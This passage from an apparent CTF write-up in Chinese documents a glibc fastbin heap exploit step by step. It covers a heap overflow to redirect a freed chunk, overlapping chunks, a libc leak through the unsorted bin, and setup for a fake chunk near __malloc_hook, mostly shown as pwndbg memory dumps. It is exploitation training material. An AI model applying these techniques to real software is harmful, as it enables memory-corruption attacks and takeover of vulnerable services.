<h4 id="3-释放1、2块"><a href="#3-释放1、2块" class="headerlink" title="3.释放1、2块"></a>3.释放1、2块</h4><blockquote>
<p>为double free做准备，其中 块2指向块1</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#1</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">#指向块1，先进后出</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6020	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="4-令释放块2指向块4"><a href="#4-令释放块2指向块4" class="headerlink" title="4.令释放块2指向块4"></a>4.令释放块2指向块4</h4><blockquote>
<p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="5-为绕过检测，修改块4：0x80-gt-0x10"><a href="#5-为绕过检测，修改块4：0x80-gt-0x10" class="headerlink" title="5.为绕过检测，修改块4：0x80-&gt;0x10"></a>5.为绕过检测，修改块4：0x80-&gt;0x10</h4><blockquote>
<p>溢出实现</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>修改成功，但是由于chunk4的大小修改了，故找不到top chunk了，故后期需要把大小：0x10-&gt;0x80</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过溢出，成功修改了chunk2指向chunk4，导致未释放的chunk4加入到了bin中，重新allocate，导致idx=2、4都为同一个块。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555923ab8040 —▸ 0x555923ab8080 ◂— 0x21 &#x2F;* &#39;!&#39; *&#x2F;</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<h4 id="6-重新申请回两个块"><a href="#6-重新申请回两个块" class="headerlink" title="6.重新申请回两个块"></a>6.重新申请回两个块</h4><blockquote>
<p>1、2、4</p>
<p>释放：块1-&gt;块2</p>
<p>修改：块2-&gt;块4</p>
<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
<p>故</p>
<ul>
<li>原块1直接释放态-&gt;allocate态</li>
<li>原块2-&gt;idx1</li>
<li>原块4-&gt;idx2</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#先进后出</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>

<h4 id="7-重新修改chunk4：0x10-gt-0x80"><a href="#7-重新修改chunk4：0x10-gt-0x80" class="headerlink" title="7.重新修改chunk4：0x10-&gt;0x80"></a>7.重新修改chunk4：0x10-&gt;0x80</h4><blockquote>
<p>为了让top chunk重新找得到，故需要重新讲chunk4的大小修改回0x80，以便于之后申请操作。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">#0</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line">#1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">#new 1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">#3</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line">#2、4</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>

<h4 id="8-申请一个块，防止块4free与top-chunk合并"><a href="#8-申请一个块，防止块4free与top-chunk合并" class="headerlink" title="8.申请一个块，防止块4free与top chunk合并"></a>8.申请一个块，防止块4free与top chunk合并</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">#alloc(0x80)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>

<h4 id="9-释放chunk4"><a href="#9-释放chunk4" class="headerlink" title="9.释放chunk4"></a>9.释放chunk4</h4><blockquote>
<p>因为此时idx2、4都指向chunk4，故可以释放chunk4，此时它里面会填入main_arena中地址，可以计算得到libc_base</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>

<h4 id="10-打印idx2-即idx4内容"><a href="#10-打印idx2-即idx4内容" class="headerlink" title="10.打印idx2(即idx4内容)"></a>10.打印idx2(即idx4内容)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base &#x3D; u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure>

<h4 id="11-申请0x60的块"><a href="#11-申请0x60的块" class="headerlink" title="11.申请0x60的块"></a>11.申请0x60的块</h4><blockquote>
<p>新块的idx为4（把idx4给了分配的块，为分配的0x21没有idx）</p>
<p>切割0x91的块，剩下0x21放入了unsortedbin中</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>

<h4 id="12-释放0x60的块"><a href="#12-释放0x60的块" class="headerlink" title="12.释放0x60的块"></a>12.释放0x60的块</h4><blockquote>
<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>

<h4 id="13-修改idx2的内容，为malloc-hook附近构造chunk的地址"><a href="#13-修改idx2的内容，为malloc-hook附近构造chunk的地址" class="headerlink" title="13.修改idx2的内容，为malloc_hook附近构造chunk的地址"></a>13.修改idx2的内容，为malloc_hook附近构造chunk的地址</h4><blockquote>
<p>需要改地址，有fastbin大小的八字节数字，，，</p>
</blockquote>
